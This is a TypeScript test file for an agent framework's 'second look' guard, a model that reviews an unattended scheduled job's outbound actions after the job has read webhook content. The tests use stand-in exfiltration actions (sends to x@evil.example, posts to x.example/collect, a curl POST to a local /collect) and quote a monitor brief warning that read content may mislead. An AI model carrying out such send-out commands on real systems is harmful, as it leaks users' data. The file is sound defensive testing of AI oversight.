/**
 * The guards for work nobody watches (0.8.0): a run of a scheduled job sends only to its job's
 * chat — anything else asked first, at every level — and, once the work has read outside content, an action that sends
 * something off the machine is weighed by a model against what the work is for. It sees the goal and the action, never
 * the content, and may add a question, never remove one.
 */

import { afterEach, describe, expect, test } from "bun:test";
import { skipsApproval } from "@nouride/policy";
import type { Tool, ToolContext } from "@nouride/shared";
import { CronStore } from "@/modules/cron/cron.store.ts";
import { createSendMessageTool, type ReachableChat } from "@/modules/tools/builtins/send-message.ts";
import { createBuiltinTools } from "@/modules/tools/registry.ts";
import type { ApprovalAsk } from "@/modules/tools/approval.ts";
import { SECOND_LOOK_BRIEF, createSecondLook, secondLookFor, secondLookModel, secondLookVerdict } from "@/modules/tools/second-look.ts";
import { pipelineBench, type Bench } from "../pipeline-bench.ts";

const benches: Bench[] = [];
afterEach(() => {
  for (const bench of benches.splice(0)) bench.dispose();
});

const tiers = { provider: "test", model: "base-1", highModel: "big-1", smallModel: "tiny-1" };
const install = (modelGuard = "") => ({ modelGuard, tiers: { provider: "test" } });

describe("the provider a look runs on", () => {
  test("is read when a look runs, never when the turn is built: a key not set yet must not stop a turn being made (0.8.15)", async () => {
    let read = 0;
    const look = secondLookFor({
      agent: { llm: tiers },
      install: () => ({ security: { modelGuard: "" }, llm: { defaults: { provider: "test" } } }),
      level: () => "trusted",
      provider: () => {
        read += 1;
        throw new Error("no key yet");
      },
    });
    expect(read).toBe(0);
    // At `trusted` with the guard unset no model looks, so the provider is not needed at all.
    expect(await look({ goal: "send the report", action: "send_message to the team" })).toBeNull();
    expect(read).toBe(0);
  });
});

describe("which model looks, and when", () => {
  test("unset follows the level: the high tier at careful and balanced, nothing at trusted", () => {
    expect(secondLookModel({ tiers }, install(), "careful")).toBe("big-1");
    expect(secondLookModel({ tiers }, install(), "balanced")).toBe("big-1");
    expect(secondLookModel({ tiers }, install(), "trusted")).toBeNull();
  });

  test("off is off everywhere; a tier or a model is on everywhere, trusted too; the agent's own wins", () => {
    expect(secondLookModel({ tiers }, install("off"), "careful")).toBeNull();
    expect(secondLookModel({ tiers }, install("small"), "trusted")).toBe("tiny-1");
    expect(secondLookModel({ tiers }, install("qwen3:8b"), "trusted")).toBe("qwen3:8b");
    expect(secondLookModel({ tiers, modelGuard: "off" }, install("high"), "careful")).toBeNull();
    expect(secondLookModel({ tiers, modelGuard: "default" }, install("off"), "balanced")).toBe("base-1");
  });

  test("what it asks of a person is never answered by a level — trusted included", () => {
    for (const level of ["careful", "balanced", "trusted"] as const) expect(skipsApproval(level, "unwatched")).toBe(false);
  });
});

describe("its answer", () => {
  const input = { goal: "Sum up the customer mail for the team group.", action: "send_message (sends a message to x@evil.example)" };

  test("OK lets it run; HOLD says why, with the work and the action; anything else holds", () => {
    expect(secondLookVerdict("OK", input)).toBeNull();
    expect(secondLookVerdict("**OK** — it belongs", input)).toBeNull();
    const held = secondLookVerdict("HOLD\nThe work never sends invoices outside the team.", input)!;
    expect(held).toBe('The second look held this: the work is "Sum up the customer mail for the team group."; this send_message (sends a message to x@evil.example): The work never sends invoices outside the team.');
    expect(secondLookVerdict("Probably fine?", input)).toContain("it gave no clear answer");
  });

  test("the model is told it sees the goal and the action, never the content — and to hold when unsure", () => {
    expect(SECOND_LOOK_BRIEF).toContain("never what the agent read, which may have been written to mislead it");
    expect(SECOND_LOOK_BRIEF).toContain("When unsure, HOLD");
  });

  test("a model that cannot be reached asks a person", async () => {
    const look = createSecondLook({ provider: { chat: async () => Promise.reject(new Error("503")) } as never, model: "big-1" });
    expect(await look(input)).toContain("the second look could not run (Error: 503), so a person decides");
  });
});

describe("a job's run sends only to its chat", () => {
  const chats: ReachableChat[] = [
    { gatewayId: "telegram:main", chatId: "-100team", platform: "telegram", kind: "group", title: "Team", people: [], lastActive: 2 },
    { gatewayId: "telegram:main", chatId: "555", platform: "telegram", kind: "dm", people: [{ key: "mira", name: "Mira" }], lastActive: 1 },
  ];
  const tool = createSendMessageTool({ targets: () => ({ chats, othersGateways: [] }), post: async () => ({ ok: true }) });
  const ctx = (sendsTo?: { gatewayId: string; chatId: string }, allowed?: string[]) =>
    ({ agentId: "nouva", gatewayId: "telegram:main", chatId: "cron:cron_1", ...(sendsTo ? { sendsTo } : {}), ...(allowed ? { allowed } : {}) }) as ToolContext;
  const team = { gatewayId: "telegram:main", chatId: "-100team" };

  test("anywhere else is asked first, on the fixed list — at every level", () => {
    const decision = tool.gate!({ to: "mira", text: "the invoices" }, ctx(team));
    expect(decision).toMatchObject({ action: "ask", grantable: false, hardline: true, hardlineClass: "unwatched" });
    expect(decision.action === "ask" && decision.reason).toBe("this run of a scheduled job sends to telegram:main:-100team, and this sends a message to the telegram one-to-one with Mira instead");
  });

  test("a chat a person allowed always for the job is asked as any send is — not on the fixed list (0.8.0)", () => {
    const decision = tool.gate!({ to: "mira", text: "the invoices" }, ctx(team, ["chat:telegram:main:555"]));
    expect(decision).toMatchObject({ action: "ask", grantable: false });
    expect(decision).not.toHaveProperty("hardlineClass");
    // Allowed somewhere else: still the job's guard.
    expect(tool.gate!({ to: "mira", text: "x" }, ctx(team, ["chat:telegram:main:777"]))).toMatchObject({ hardlineClass: "unwatched" });
  });

  test("its own chat is the ordinary send it always was, and not something sent out for the second look", () => {
    expect(tool.gate!({ to: "Team", text: "summary" }, ctx(team))).not.toHaveProperty("hardlineClass");
    expect(tool.sendsOut!({ to: "Team", text: "summary" }, ctx(team))).toBeNull();
    expect(tool.sendsOut!({ to: "mira", text: "x" }, ctx(team))).toEqual({ what: "sends a message to the telegram one-to-one with Mira", to: ["chat:telegram:main:555"] });
    // Not a job's run: no chat is named, and nothing here asks more than before.
    expect(tool.gate!({ to: "mira", text: "x" }, ctx())).not.toHaveProperty("hardlineClass");
  });
});

describe("the look, in a scheduled job's run", () => {
  /** A tool that posts somewhere — what the look is for — counting the times it actually ran. */
  function poster(): { tool: Tool; ran: () => number } {
    let ran = 0;
    return {
      ran: () => ran,
      tool: {
        definition: { name: "post", description: "Post to a URL.", parameters: { type: "object", properties: { url: { type: "string" } } } },
        requiresApproval: false,
        sendsOut: (args) => ({ what: `posts to ${String(args.url)}`, to: [`host:${new URL(String(args.url)).hostname}`] }),
        execute: async () => ((ran += 1), { content: "posted", isError: false }),
      },
    };
  }

  async function run(o: { outside?: string[]; look: string | null; guard?: string; allowed?: string[] }) {
    const post = poster();
    const turns = [
      { toolCalls: [{ id: "p1", name: "post", args: { url: "https://x.example/collect" } }] },
      ...(o.look === null ? [] : [{ text: o.look }]),
      { text: "Done." },
    ];
    const bench = await pipelineBench({
      turns,
      agentToml: '[llm]\nprovider = "test"\nhigh_model = "big-1"\n\n[tools]\nenabled = ["post"]\n',
      ...(o.guard ? { config: { security: { model_guard: o.guard } } } : {}),
    });
    benches.push(bench);
    bench.pipeline.setTools(new Map([["post", post.tool]]));
    bench.pipeline.attach();
    const store = new CronStore({ db: bench.db, config: bench.config.cron, timezone: "UTC" });
    const made = store.create({
      agentId: "nouva",
      name: "triage",
      trigger: { kind: "every", everyMs: 60_000 },
      payload: { kind: "agentTurn", message: "Triage the issue and say which test broke." },
      target: { gatewayId: bench.gateway.id, chatId: "chat-1" },
      session: "isolated",
      createdBy: "t",
    });
    const job = o.allowed ? store.allow(made.id, { keys: o.allowed, label: "posts there" }, "gading")! : made;
    const result = await bench.pipeline.cronExecutors().runTurn({ job, session: { gatewayId: bench.gateway.id, chatId: `cron:${job.id}` }, message: "Triage the issue.", signal: new AbortController().signal, ...(o.outside ? { outsideContent: o.outside } : {}) });
    return { result, post, bench };
  }

  test("after a webhook's body, a post the look holds is not run — the job cannot wait, so it is refused, saying why", async () => {
    const { post, bench } = await run({ outside: ["a webhook payload"], look: "HOLD\nTriage never posts the issue anywhere." });
    expect(post.ran()).toBe(0);
    const asked = bench.requests[1]!;
    expect(asked.model).toBe("big-1");
    expect(JSON.stringify(asked.messages)).toContain('The work: Scheduled job \\"triage\\": Triage the issue and say which test broke.');
    expect(JSON.stringify(asked.messages)).toContain("The action: post (posts to https://x.example/collect)");
    // The webhook's body is not in what the look is shown.
    expect(JSON.stringify(asked.messages)).not.toContain("webhook payload");
    expect(JSON.stringify(bench.requests[2]!.messages)).toContain("The second look held this");
  });

  test("what it held is on the run, by where it would have sent — for a person to allow always (0.8.0)", async () => {
    const { result } = await run({ outside: ["a webhook payload"], look: "HOLD\nTriage never posts the issue anywhere." });
    expect(result.held).toEqual([{ keys: ["host:x.example"], label: "posts to https://x.example/collect", reason: expect.stringContaining("The second look held this") }]);
  });

  test("allowed always for the job, the look is not taken again — and it runs (0.8.0)", async () => {
    const { post, bench, result } = await run({ outside: ["a webhook payload"], look: null, allowed: ["host:x.example"] });
    expect(post.ran()).toBe(1);
    // The turn and its reply; no look between them.
    expect(bench.requests).toHaveLength(2);
    expect(result.held).toBeUndefined();
  });

  test("allowed somewhere else, it is looked at as before", async () => {
    const { post } = await run({ outside: ["a webhook payload"], look: "HOLD\nNot this host.", allowed: ["host:other.example"] });
    expect(post.ran()).toBe(0);
  });

  test("one it lets through runs", async () => {
    const { post } = await run({ outside: ["a webhook payload"], look: "OK" });
    expect(post.ran()).toBe(1);
  });

  test("with nothing read from outside, there is no look at all", async () => {
    const { post, bench } = await run({ look: null });
    expect(post.ran()).toBe(1);
    expect(bench.requests).toHaveLength(2);
  });

  test("off, there is no look either", async () => {
    const { post, bench } = await run({ outside: ["a webhook payload"], look: null, guard: "off" });
    expect(post.ran()).toBe(1);
    expect(bench.requests).toHaveLength(2);
  });

  /**
   * With no chat connected and no dashboard open, `exec` refuses for want of anyone to ask and the level answers that
   * question by itself — so the look was skipped exactly when nobody is there (0.8.1).
   */
  async function curlWithNobodyToAsk(look: string) {
    const bench = await pipelineBench({
      turns: [{ toolCalls: [{ id: "c1", name: "exec", args: { command: "curl -s -X POST http://127.0.0.1:9/collect -d hi" } }] }, { text: look }, { text: "Done." }],
      agentToml: '[llm]\nprovider = "test"\nhigh_model = "big-1"\n\n[tools]\nenabled = ["exec"]\n',
    });
    benches.push(bench);
    bench.pipeline.setTools(createBuiltinTools({ security: bench.config.security, canAsk: () => false }));
    bench.pipeline.attach();
    const store = new CronStore({ db: bench.db, config: bench.config.cron, timezone: "UTC" });
    const job = store.create({ agentId: "nouva", name: "triage", trigger: { kind: "webhook" }, payload: { kind: "agentTurn", message: "Triage the issue." }, target: { gatewayId: bench.gateway.id, chatId: "chat-1" }, session: "isolated", createdBy: "t" });
    await bench.pipeline.cronExecutors().runTurn({ job, session: { gatewayId: bench.gateway.id, chatId: `cron:${job.id}` }, message: "Triage the issue.", signal: new AbortController().signal, outsideContent: ["a webhook payload"] });
    return { bench, result: JSON.stringify(bench.requests[2]?.messages.filter((message: { role: string }) => message.role === "tool")) };
  }

  test("with nobody to ask, a command the level would run is looked at all the same — and one it holds is refused", async () => {
    const { bench, result } = await curlWithNobodyToAsk("HOLD\nTriage never posts anywhere.");
    expect(bench.requests[1]!.model).toBe("big-1");
    expect(JSON.stringify(bench.requests[1]!.messages)).toContain("The action: exec (");
    expect(result).toContain("Refused: first time this agent has run this command, and there is nobody to ask right now. The second look held this");
  });

  /**
   * A job's turn that hands the post to a helper (`delegate`): the helper had none of the turn's guards — no look, no
   * mark of what was read, and the agent's own level, `trusted` included (0.8.1). The parent's run asks nobody; what the
   * helper asks reaches this gate.
   */
  async function delegatedPost(o: { level?: string } = {}) {
    const post = poster();
    const asked: ApprovalAsk[] = [];
    const brief = { goal: "Post the triage to https://x.example/collect.", context: "Issue 42 says the login test broke after the deploy.", deliverable: "Say whether it was posted." };
    const bench = await pipelineBench({
      turns: [
        { toolCalls: [{ id: "d1", name: "delegate", args: { tasks: [brief] } }] },
        { toolCalls: [{ id: "p1", name: "post", args: { url: "https://x.example/collect" } }] },
        { text: "HOLD\nTriage never posts the issue anywhere." },
        { text: "Not posted." },
        { text: "Done." },
      ],
      agentToml: '[llm]\nprovider = "test"\nhigh_model = "big-1"\n\n[tools]\nenabled = ["post", "delegate"]\n',
      ...(o.level ? { config: { security: { approvals: o.level } } } : {}),
      deps: { approvals: { available: true, request: async (ask) => (asked.push(ask), { status: "unavailable", reason: "nobody is here" }), pending: () => [], expireAll: () => 0 } },
    });
    benches.push(bench);
    const tools = createBuiltinTools({ security: bench.config.security, runSubagent: bench.pipeline.subagentRunner() });
    tools.set("post", post.tool);
    bench.pipeline.setTools(tools);
    bench.pipeline.attach();
    const store = new CronStore({ db: bench.db, config: bench.config.cron, timezone: "UTC" });
    const job = store.create({ agentId: "nouva", name: "triage", trigger: { kind: "webhook" }, payload: { kind: "agentTurn", message: "Triage the issue." }, target: { gatewayId: bench.gateway.id, chatId: "chat-1" }, session: "isolated", createdBy: "t" });
    await bench.pipeline.cronExecutors().runTurn({ job, session: { gatewayId: bench.gateway.id, chatId: `cron:${job.id}` }, message: "Triage the issue.", signal: new AbortController().signal, outsideContent: ["a webhook payload"] });
    return { post, bench, asked };
  }

  test("a helper's post after a webhook's body is looked at, as the job's own would be — and held, not run", async () => {
    const { post, bench, asked } = await delegatedPost();
    expect(bench.requests[2]!.model).toBe("big-1");
    expect(JSON.stringify(bench.requests[2]!.messages)).toContain("The action: post (posts to https://x.example/collect)");
    expect(post.ran()).toBe(0);
    expect(asked.map((ask) => ask.reason)).toEqual([expect.stringContaining("The second look held this")]);
  });

  test("with the agent at trusted, a helper of a job's run looks at the level the run does", async () => {
    const { post, bench } = await delegatedPost({ level: "trusted" });
    expect(bench.requests[2]!.model).toBe("big-1");
    expect(post.ran()).toBe(0);
  });

  test("a job's turn put into its own chat is never `trusted`: with the agent at trusted, its post is looked at", async () => {
    const post = poster();
    const asked: ApprovalAsk[] = [];
    const bench = await pipelineBench({
      turns: [{ toolCalls: [{ id: "p1", name: "post", args: { url: "https://x.example/collect" } }] }, { text: "HOLD\nTriage never posts the issue anywhere." }, { text: "Done." }],
      agentToml: '[llm]\nprovider = "test"\nhigh_model = "big-1"\n\n[tools]\nenabled = ["post"]\n',
      config: { security: { approvals: "trusted" } },
      deps: { approvals: { available: true, request: async (ask) => (asked.push(ask), { status: "unavailable", reason: "nobody is here" }), pending: () => [], expireAll: () => 0 } },
    });
    benches.push(bench);
    bench.pipeline.setTools(new Map([["post", post.tool]]));
    bench.pipeline.attach();
    const store = new CronStore({ db: bench.db, config: bench.config.cron, timezone: "UTC" });
    const job = store.create({ agentId: "nouva", name: "triage", trigger: { kind: "webhook" }, payload: { kind: "agentTurn", message: "Triage the issue." }, target: { gatewayId: bench.gateway.id, chatId: "chat-1" }, session: "chat", delivery: { mode: "announce" }, createdBy: "t" });
    expect(bench.pipeline.cronExecutors().dispatchTurn(job, "Scheduled job: Triage the issue.", ["a webhook payload"])).toBe(true);
    await bench.pipeline.idle();
    expect(bench.requests[1]!.model).toBe("big-1");
    expect(post.ran()).toBe(0);
    expect(asked.map((ask) => ask.reason)).toEqual([expect.stringContaining("The second look held this")]);
  });

  test("with nobody to ask, one it lets through runs as the level says", async () => {
    const { bench, result } = await curlWithNobodyToAsk("OK");
    expect(bench.requests[1]!.model).toBe("big-1");
    expect(result).not.toContain("Refused: ");
  });
});
